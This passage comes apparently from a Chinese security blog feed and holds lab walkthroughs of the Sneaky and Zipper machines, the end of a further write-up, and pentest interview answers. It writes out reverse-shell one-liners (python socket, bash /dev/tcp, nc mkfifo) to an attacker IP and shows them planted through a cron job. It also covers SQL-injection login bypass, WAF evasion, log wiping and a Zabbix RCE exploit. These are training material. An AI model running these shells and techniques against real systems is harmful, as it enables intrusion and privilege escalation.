class="hljs-keyword">sh</span>&#x27;);<br>?&gt;<br><br>---<br><span class="hljs-keyword">ls</span> -al /<span class="hljs-keyword">var</span>/www/cronjobs/clearlogs<br>-r-xr-xr-x 1 root root 132 May 12  2017 /<span class="hljs-keyword">var</span>/www/cronjobs/clearlogs<br><br><span class="hljs-keyword">ls</span> -al /<span class="hljs-keyword">var</span>/www/cmd/logcleared.<span class="hljs-keyword">sh</span><br><span class="hljs-keyword">ls</span>: cannot access &#x27;/<span class="hljs-keyword">var</span>/www/cmd/logcleared.<span class="hljs-keyword">sh</span>&#x27;: <span class="hljs-keyword">No</span> such <span class="hljs-keyword">file</span> or directory<br><br>于是可以通过定时任务执行/<span class="hljs-keyword">var</span>/www/cmd/logcleared.<span class="hljs-keyword">sh</span>，<br><br>本地监听8899端口，然后<span class="hljs-keyword">shell</span>执行<br>touch /<span class="hljs-keyword">var</span>/www/cmd/logcleared.<span class="hljs-keyword">sh</span><br><br>echo &#x27;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.10.14.18&quot;</span>,8899));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27; &gt; /<span class="hljs-keyword">var</span>/www/cmd/logcleared.<span class="hljs-keyword">sh</span><br>失败<br>echo <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.18/8899 0&gt;&amp;1&quot;</span> &gt; /<span class="hljs-keyword">var</span>/www/cmd/logcleared.<span class="hljs-keyword">sh</span><br>失败<br><br>echo <span class="hljs-string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.18 8899 &gt;/tmp/f&quot;</span> &gt; /<span class="hljs-keyword">var</span>/www/cmd/logcleared.<span class="hljs-keyword">sh</span>;chmod +x /<span class="hljs-keyword">var</span>/www/cmd/logcleared.<span class="hljs-keyword">sh</span><br><br>经过尝试，最后一个payload是最好用的。<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-27-09/1.PNG" alt="1"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在sql注入输入<a href="mailto:&#97;&#x64;&#x6d;&#x69;&#110;&#64;&#x65;&#x75;&#114;&#x6f;&#112;&#97;&#x63;&#111;&#x72;&#112;&#x2e;&#104;&#116;&#x62;">&#97;&#x64;&#x6d;&#x69;&#110;&#64;&#x65;&#x75;&#114;&#x6f;&#112;&#97;&#x63;&#111;&#x72;&#112;&#x2e;&#104;&#116;&#x62;</a>‘ or ‘1’=’1的时候，页面js脚本总是弹出用户名不是邮箱，这时候该怎么办呢？</p><p>这里有一个小技巧：</p><p>点击intercept is on，通过burp proxy拦截输入用户名密码里的数据包，然后修改数据包中的内容，修改完成后，点击intercept is off。</p><p>这时候数据包就会直接发往服务器，你就可以看到网页已经登陆了。</p><p>这是绕过js验证的一个技巧。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sneaky(snmp默认口令泄露敏感信息)</title>
    <link href="/2019/10/26/07-x/"/>
    <url>/2019/10/26/07-x/</url>
    
    <content type="html"><![CDATA[<h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">161</span>/udp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.20</span>                                    <br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">80</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.20</span> <br><br><span class="hljs-number">80</span>/tcp  <span class="hljs-keyword">open</span>   http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.7</span> ((Ubuntu))<br>|_http-<span class="hljs-keyword">server</span>-<span class="hljs-keyword">header</span>: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.7</span> (Ubuntu)<br>|_http-title: Under Development!<br><span class="hljs-number">161</span>/tcp closed snmp<br></code></pre></div></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>单引号报错，双单引号页面正常，说明有sql注入漏洞。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-26-07/28.PNG" alt="28"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-26-07/29.PNG" alt="29"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-26-07/30.PNG" alt="30"></p><p>用户名admin，密码123’or’1’=’1   登入页面，获得一个ssh密钥。</p><p>保存密钥为id.rsa文件。</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">chmod <span class="hljs-number">400</span> id<span class="hljs-selector-class">.rsa</span><br>ssh -<span class="hljs-selector-tag">i</span> id<span class="hljs-selector-class">.rsa</span> admin@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.20</span><br>ssh -<span class="hljs-selector-tag">i</span> id<span class="hljs-selector-class">.rsa</span> thrasivoulos@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.20</span><br>猜测用户名失败，Connection refused<br></code></pre></div></td></tr></table></figure><h3 id="sql注入提取有效用户名"><a href="#sql注入提取有效用户名" class="headerlink" title="sql注入提取有效用户名"></a>sql注入提取有效用户名</h3><p>sqlmap -r sql</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-26-07/31.PNG" alt="31"></p><h2 id="snmp"><a href="#snmp" class="headerlink" title="snmp"></a>snmp</h2><p><a href="https://whale3070.github.io/tools/2019/03/11/x/">snmp&amp;snmpwalk</a></p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">snmpwalk</span> -c public -v <span class="hljs-number">1</span> <span class="hljs-number">10.10.10.20</span><br>snmpwalk -Os -c public -v <span class="hljs-number">1</span> <span class="hljs-number">10.10.10.20</span> -t <span class="hljs-number">30</span><br>将延时设置为<span class="hljs-number">30</span>秒<br><br>use scanner/snmp/snmp_enum<br>set RHOSTS <span class="hljs-number">10.10.10.20</span><br><br>git clone https://github.com/trickster0/Enyx;<span class="hljs-attribute">cd</span> Enyx<br>python enyx.py  2c  public  <span class="hljs-number">10.10.10.20</span><br><br>ssh -i id.rsa -<span class="hljs-number">6</span> thrasivoulos@dead:beef:<span class="hljs-number">0000</span>:<span class="hljs-number">0000</span>:<span class="hljs-number">0250</span>:56ff:feb9:d82f<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-26-07/32.PNG" alt="32"></p><p>【本地执行】python -m SimpleHTTPServer 888</p><p>【获得的shell执行】cd /tmp;wget <a href="http://10.10.14.18:888/linux-exploit-suggester.sh">http://10.10.14.18:888/linux-exploit-suggester.sh</a><br>chmod a+x linux*;./linux* &gt; out.txt</p><p>找到了一个suid程序，可以进行缓冲区溢出来获得root权限。这一部分不是很熟悉，等以后有时间再深入学习下吧。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次实验演示了snmp public/private默认口令泄露主机敏感信息的情况。</p><p>ssh禁止了ipv4连接，Connection refused，但是还有ipv6地址。这个思路一般人想不到吧。。。<br>第一次使用了IPv6地址进行ssh登陆。每一次主机重启，IPv6地址都会改变。</p><p>msf的snmp_enum模块可以枚举默认密码的设备的详细信息，但是对于延时很严格，网络不好很可能得不到查询结果。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应届生的面试题</title>
    <link href="/2019/10/11/05-x/"/>
    <url>/2019/10/11/05-x/</url>
    
    <content type="html"><![CDATA[<h1 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h1><h2 id="TCP和UDP有什么区别？"><a href="#TCP和UDP有什么区别？" class="headerlink" title="TCP和UDP有什么区别？"></a>TCP和UDP有什么区别？</h2><p>TCP是面向连接的，UDP无连接、不可靠</p><h2 id="举例一些常见的协议以及对应的端口"><a href="#举例一些常见的协议以及对应的端口" class="headerlink" title="举例一些常见的协议以及对应的端口"></a>举例一些常见的协议以及对应的端口</h2><h2 id="tcp-ip协议有哪4层？"><a href="#tcp-ip协议有哪4层？" class="headerlink" title="tcp/ip协议有哪4层？"></a>tcp/ip协议有哪4层？</h2><p>tcp/ip协议包括网络接口层、网络层（ARP、ICMP）、传输层(tcp、udp)、应用层</p><h2 id="cookie和session的区别？"><a href="#cookie和session的区别？" class="headerlink" title="cookie和session的区别？"></a>cookie和session的区别？</h2><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">它们都是web服务器用来区别不同客户的。<br>cookie是一串小文本字符串存储在客户端，而<span class="hljs-keyword">session</span>的形式和大小没有要求，存储在服务器端。<br><br>cookie的过期时间取决于程序的设计。<br><span class="hljs-keyword">session</span>依赖于名为JSESSIONID的cookie，而cookie JSESSIONID的过期时间默认为<span class="hljs-number">-1</span>，只需关闭窗口该<span class="hljs-keyword">session</span>就会失效，因而<span class="hljs-keyword">session</span>不能达到长期有效的效果。<br><br>两种<span class="hljs-keyword">session</span>的方式：<br><span class="hljs-number">1</span>、存储在服务端：通过cookie存储一个session_id，然后具体的数据则是保存在<span class="hljs-keyword">session</span>中。如果用户已经登录，则服务器会在cookie中保存一个session_id，下次再次请求的时候，会把该session_id携带上来，服务器根据session_id在<span class="hljs-keyword">session</span>库中获取用户的<span class="hljs-keyword">session</span>数据。就能知道该用户到底是谁，以及之前保存的一些状态信息。这种专业术语叫做<span class="hljs-keyword">server</span> side <span class="hljs-keyword">session</span>。<br><br><span class="hljs-number">2</span>、将<span class="hljs-keyword">session</span>数据加密，然后存储在cookie中。这种专业术语叫做client side <span class="hljs-keyword">session</span>。flask采用的就是这种方式，但是也可以替换成其他形式。<br></code></pre></div></td></tr></table></figure><h1 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h1><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> nmap扫描参数<br><span class="hljs-bullet">2.</span> burp爆破弱口令修改线程<br><span class="hljs-bullet">3.</span> metasploit <br><span class="hljs-bullet">4.</span> cobalt strike<br><span class="hljs-bullet">5.</span> sqlmap各种扫描方式使用的参数<br></code></pre></div></td></tr></table></figure><h1 id="xss与sql注入"><a href="#xss与sql注入" class="headerlink" title="xss与sql注入"></a>xss与sql注入</h1><h2 id="xss有哪些类型"><a href="#xss有哪些类型" class="headerlink" title="xss有哪些类型"></a>xss有哪些类型</h2><p>反射型、存储型、DOM类型</p><h2 id="DOM类型XSS和其他类型的区别？"><a href="#DOM类型XSS和其他类型的区别？" class="headerlink" title="DOM类型XSS和其他类型的区别？"></a>DOM类型XSS和其他类型的区别？</h2><p>DOM类型是文档对象模型的意思，当用户输入参数可以修改文档对象模型，插入js代码，就可以叫做DOM XSS。</p><p>与其他XSS的区别是，DOM XSS并不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析。</p><h2 id="请简述下XSS和CSRF的区别？"><a href="#请简述下XSS和CSRF的区别？" class="headerlink" title="请简述下XSS和CSRF的区别？"></a>请简述下XSS和CSRF的区别？</h2><p>XSS是跨站脚本伪造的意思，分为反射型xss，存储型xss，以及DOM类型。<br>当页面没有过滤用户输入的参数，就可以插入js脚本。如果是用户输入，页面马上输出的就叫做反射型xss。<br>如果用户输入保存到了数据库中，每个访问网页的用户都能访问，就是存储型xss。</p><p>csrf是客户端请求伪造的意思，攻击者需要伪造一个用户的身份来达到目的，例如利用管理员权限来新建用户之类。csrf需要登陆后操作，xss不需要。csrf的重点在于伪造用户的身份，而xss重点在于在web应用插入脚本语言。</p><h2 id="xss的防御方式？"><a href="#xss的防御方式？" class="headerlink" title="xss的防御方式？"></a>xss的防御方式？</h2><p>过滤标签<script> "</p><h2 id="csrf漏洞的防御方式？"><a href="#csrf漏洞的防御方式？" class="headerlink" title="csrf漏洞的防御方式？"></a>csrf漏洞的防御方式？</h2><p>验证http referer；添加token验证</p><h2 id="xss检查"><a href="#xss检查" class="headerlink" title="xss检查"></a>xss检查</h2><p>一般意义上的XSS通常可以用简单的方法检测出来：当用户输入中某个参数的全部或其中一部分，原封不动地在源代码里出现时，我们就可以认为这个参数存在XSS漏洞。</p><h2 id="SQL注入的无回显形式是怎样的？"><a href="#SQL注入的无回显形式是怎样的？" class="headerlink" title="SQL注入的无回显形式是怎样的？"></a>SQL注入的无回显形式是怎样的？</h2><p>SQL注入在网页前端无任何回显就是sql盲注。<br>sql盲注分为布尔型盲注，基于时间的盲注。</p><p>布尔型盲注：网页对于true或者false的sql查询语句，页面的响应不同，一般可以通过burp里页面长度参数可以观察到。</p><p>第二种是基于时间的盲注，无论sql语句是否正确，页面都没有不同。如果使用延时函数，如果网页确实延迟了响应，那么就说明有sql盲注。</p><h2 id="sql注入有几种类型？"><a href="#sql注入有几种类型？" class="headerlink" title="sql注入有几种类型？"></a>sql注入有几种类型？</h2><p>根据页面的响应方式，可以分为报错型注入、盲注、联合查询注入、堆查询注入。</p><h2 id="mysql5-0以上和以下有什么区别？"><a href="#mysql5-0以上和以下有什么区别？" class="headerlink" title="mysql5.0以上和以下有什么区别？"></a>mysql5.0以上和以下有什么区别？</h2><p>小于mysql 5.0，没有information_schema这个表，需要暴力破解跑表名</p><h2 id="mysql直接写入一句话需要的条件。"><a href="#mysql直接写入一句话需要的条件。" class="headerlink" title="mysql直接写入一句话需要的条件。"></a>mysql直接写入一句话需要的条件。</h2><p>注入点是dba权限（最高权限），并且知道网站绝对路径。</p><h2 id="Linux日志一般记录在哪里？"><a href="#Linux日志一般记录在哪里？" class="headerlink" title="Linux日志一般记录在哪里？"></a>Linux日志一般记录在哪里？</h2><p>/var/log</p><h2 id="php反序列化漏洞是什么？怎么防御？"><a href="#php反序列化漏洞是什么？怎么防御？" class="headerlink" title="php反序列化漏洞是什么？怎么防御？"></a>php反序列化漏洞是什么？怎么防御？</h2><p>当以序列化方式保存变量的时候，如果变量可以被用户恶意修改。那么当反序列化执行脚本的时候，就执行了攻击者的代码。</p><p>防御：对用户可控的参数，在反序列化后对参数进行严格的检查。</p><h2 id="mysql有哪些函数，举个例子："><a href="#mysql有哪些函数，举个例子：" class="headerlink" title="mysql有哪些函数，举个例子："></a>mysql有哪些函数，举个例子：</h2><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">bin</span><span class="hljs-params">()</span></span> 数字转为二进制<br><span class="hljs-function"><span class="hljs-title">date</span><span class="hljs-params">()</span></span> 提取时间的函数<br><span class="hljs-function"><span class="hljs-title">ascii</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">length</span><span class="hljs-params">()</span></span><br></code></pre></div></td></tr></table></figure><h1 id="渗透实战"><a href="#渗透实战" class="headerlink" title="渗透实战"></a>渗透实战</h1><ol><li>为何一个mysql数据库的站，只有80端口开放？<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. 开放了数据库端口，但是不是<span class="hljs-number">3306</span>端口，修改到了不常用的端口。这时候需要<span class="hljs-number">65535</span>个端口全部扫描一遍。<br><span class="hljs-attribute">2</span>. 站库分离。数据库在内网中。<br><span class="hljs-attribute">3</span>. 外网不允许连接<span class="hljs-number">3306</span>端口。<br></code></pre></div></td></tr></table></figure><h2 id="遇到waf怎么办？"><a href="#遇到waf怎么办？" class="headerlink" title="遇到waf怎么办？"></a>遇到waf怎么办？</h2>waf处理请求可以分为三个阶段，针对不同的阶段，可以测试绕过waf。<br>首先在预处理阶段，waf判断是否要进行检查请求。</li></ol><p>（决定是否对请求进行检查）绕过预处理阶段，就是让waf认为我们的请求不需要检查。也就是验证waf的规则是否全面。例如waf不会检查从内网请求的IP；或许waf只检查get和post请求，不坚持其他类型或者错误类型的请求，但是未正确配置的服务器也可以进行解析；使用大量恶意的请求，使waf过载，看waf是否会忽略其中的一些恶意请求。</p><p>（理解用户的输入）标准化阶段，waf开始解析我们的请求。绕过方法是让waf的解释与服务器端不同。例如，http参数碎片，将payload拆分为不同的段插入到不同的参数中，asp.net会将参数合并，于是waf没有检测到完整的payload，但是服务器仍然执行了payload。再比如各种payload编码绕过，服务器端会将url编码进行解码并执行payload。</p><p>（根据策略检查用户的输入）验证阶段，绕过方式是使用waf检测不到的载荷。使用payload暴力枚举，找到可以使用的payload；对waf进行逆向工程得知waf的规则再针对写payload。</p><h2 id="如果给你一个机构的网站，你会怎么做渗透测试？"><a href="#如果给你一个机构的网站，你会怎么做渗透测试？" class="headerlink" title="如果给你一个机构的网站，你会怎么做渗透测试？"></a>如果给你一个机构的网站，你会怎么做渗透测试？</h2><ol><li>信息搜集</li><li>漏洞扫描<br>中间件漏洞；web漏洞；弱口令</li><li>提权<br>拿到webshell后，提权或通过reGeorg进行内网渗透。</li><li>内网渗透<br>端口转发、常规信息搜集（查找内网web应用、内网开放的端口）、漏洞扫描</li><li>痕迹擦除</li></ol><h2 id="你印象最深刻的一次渗透测试经历是怎样的？"><a href="#你印象最深刻的一次渗透测试经历是怎样的？" class="headerlink" title="你印象最深刻的一次渗透测试经历是怎样的？"></a>你印象最深刻的一次渗透测试经历是怎样的？</h2><p>扫描到一个网站，一开始只有8080 tomcat web server 和22 openssh开放，检查后没发现什么问题。<br>然后经过一段时间的全端口检查，发现60000端口开放了一个web应用。它可以用get参数获取其他web上的资源。于是可以尝试服务端请求伪造漏洞，经过测试<a href="http://localhost:888可以访问服务器本地的资源，用wfuzz找到了一个backup文件。">http://localhost:888可以访问服务器本地的资源，用wfuzz找到了一个backup文件。</a></p><p>在备份文件中得到了用户名密码，登陆8080端口的tomcat服务器，msfvenom生成一个payload反弹webshell，上传war包。在web是访问一下war包即可获得webshell权限。</p><p>拿到webshell后，在家目录找到了ntds.dit文件。用python工具提取出其中的口令，即可得到一些用户的口令。在线网站破解后，得到了一个普通用户。</p><p>当时以为不能提权了，因为常规的检查用户权限，suid权限，linux内核版本都试过了。</p><p>然后就一直做信息搜集，发现内网有个机器每隔几分钟要下载一个我们服务器archive存档文件。</p><p>信息搜集显示这台机器是linux的。用nc -v IP 3389或者其他端口，如果22端口开放，那么就可能是linux机器；3389开放就可能是windows机器。</p><p>本地日志显示，机器的wget版本是小于1.18的，有任意文件上传漏洞，于是我找到exp上传到服务器并执行，修改exp的配置然后执行，就可以拿到内网那台机器器的<code>/etc/passwd</code>文件上传到攻击机。</p>]]></content>
    
    
    <categories>
      
      <category>Interview</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Interview</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zipper docker容器靶机渗透</title>
    <link href="/2019/10/02/11-x/"/>
    <url>/2019/10/02/11-x/</url>
    
    <content type="html"><![CDATA[<p>你越功利，世界对你越神秘。废话不说，开始紧张刺激的渗透吧！</p><h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-number">22</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">ssh</span>        <span class="hljs-string">OpenSSH</span> <span class="hljs-number">7.</span><span class="hljs-string">6p1</span> <span class="hljs-string">Ubuntu</span> <span class="hljs-number">4</span> <span class="hljs-string">(Ubuntu</span> <span class="hljs-string">Linux;</span> <span class="hljs-string">protocol</span> <span class="hljs-number">2.0</span><span class="hljs-string">)</span><br><br><span class="hljs-string">|</span> <span class="hljs-attr">ssh-hostkey:</span> <br><span class="hljs-string">|</span>   <span class="hljs-number">2048 </span><span class="hljs-number">59</span><span class="hljs-string">:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e</span> <span class="hljs-string">(RSA)</span><br><span class="hljs-string">|</span>   <span class="hljs-number">256</span> <span class="hljs-string">aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76</span> <span class="hljs-string">(ECDSA)</span><br><span class="hljs-string">|_</span>  <span class="hljs-number">256</span> <span class="hljs-number">89</span><span class="hljs-string">:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84</span> <span class="hljs-string">(ED25519)</span><br><br><span class="hljs-number">80</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">http</span>       <span class="hljs-string">Apache</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.4</span><span class="hljs-number">.29</span> <span class="hljs-string">((Ubuntu))</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Apache/2.4.29</span> <span class="hljs-string">(Ubuntu)</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-attr">Apache2 Ubuntu Default Page:</span> <span class="hljs-string">It</span> <span class="hljs-string">works</span><br><br><span class="hljs-number">10050</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span><br><span class="hljs-number">2048</span><span class="hljs-string">/udp</span> <span class="hljs-string">open|filtered</span> <span class="hljs-string">dls-monitor</span> <span class="hljs-literal">no</span><span class="hljs-string">-response</span><br><span class="hljs-attr">Service Info: OS:</span> <span class="hljs-string">Linux;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:linux:linux_kernel</span><br><br><span class="hljs-string">以上结果说明ssh、web以及其他不明2端口开放，需要进一步做探测。</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">nc</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.108</span> <span class="hljs-number">10050</span><br><span class="hljs-string">结果没有任何提示或者报错，说明端口开放</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">于是进行版本扫描</span><br><span class="hljs-string">nmap</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.108</span> <span class="hljs-string">-p</span> <span class="hljs-number">10050</span><br><span class="hljs-number">10050</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">zabbix-agent</span><br><span class="hljs-meta">---</span><br><span class="hljs-number">2048</span><span class="hljs-string">端口扫描结果，提示端口关闭，于是忽略</span><br></code></pre></div></td></tr></table></figure><h2 id="enumeration"><a href="#enumeration" class="headerlink" title="enumeration"></a>enumeration</h2><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> root@<span class="hljs-number">10.10.10.108</span><br><span class="hljs-attribute">The</span> authenticity of host &#x27;<span class="hljs-number">10.10.10.108</span> (<span class="hljs-number">10.10.10.108</span>)&#x27; can&#x27;t be established.<br><span class="hljs-attribute">ECDSA</span> key fingerprint is SHA<span class="hljs-number">256</span>:cAmAZhj<span class="hljs-number">4</span>I<span class="hljs-number">2</span>L<span class="hljs-number">8</span>r<span class="hljs-number">8</span>N<span class="hljs-number">7</span>/lMousEpdqK/HoeuU<span class="hljs-number">6</span>zUIbGcdHs.<br><span class="hljs-attribute">Are</span> you sure you want to continue connecting (yes/no)? yes<br><span class="hljs-attribute">Warning</span>: Permanently added &#x27;<span class="hljs-number">10.10.10.108</span>&#x27; (ECDSA) to the list of known hosts.<br><span class="hljs-attribute">root</span>@<span class="hljs-number">10.10.10.108</span>: Permission denied (publickey).<br></code></pre></div></td></tr></table></figure><p>拒绝密码连接，要么通过web获取到id_rsa通过私钥连接；要么web远程代码执行获得webshell，再提权。</p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.108</span><br>---<br>gobuster -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.108</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt <br>/zabbix (Status: <span class="hljs-number">301</span>)<br>/server-status (Status: <span class="hljs-number">403</span>)<br><br>---<br>burp spider<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.108</span><span class="hljs-regexp">/zabbix/</span>history.php<br>Zabbix <span class="hljs-number">3.0</span>.<span class="hljs-number">21</span><br>---<br>Zabbix <span class="hljs-number">2.2</span> &lt; <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span> - API JSON-RPC Remote Code Execution <br>searchsploit -m exploits<span class="hljs-regexp">/php/</span>webapps/<span class="hljs-number">39937</span>.py<br><span class="hljs-number">1</span>. 修改exp地址为http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.108</span>/zabbix<br><span class="hljs-number">2</span>. 运行exp：  python <span class="hljs-number">39937</span>.py <br><span class="hljs-number">3</span>. 运行出错，检查exp<br>[zabbix_cmd]&gt;&gt;:  <br>Result of last command:<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;39937.py&quot;</span>, line <span class="hljs-number">55</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-string">&quot;auth&quot;</span> : auth[<span class="hljs-string">&#x27;result&#x27;</span>],<br>KeyError: <span class="hljs-string">&#x27;result&#x27;</span><br>用户名密码Admin/zabbix可能是无效口令，尝试登陆后的确失败<br><span class="hljs-number">4</span>. http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.108</span><span class="hljs-regexp">/zabbix/</span>api_jsonrpc.php该地址存在<br><span class="hljs-number">5</span>. burp截包，尝试弱密码猜测<br>name=Admin&amp;password=zabbix&amp;autologin=<span class="hljs-number">1</span>&amp;enter=Sign+<span class="hljs-keyword">in</span><br><br>hydra -L <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Usernames<span 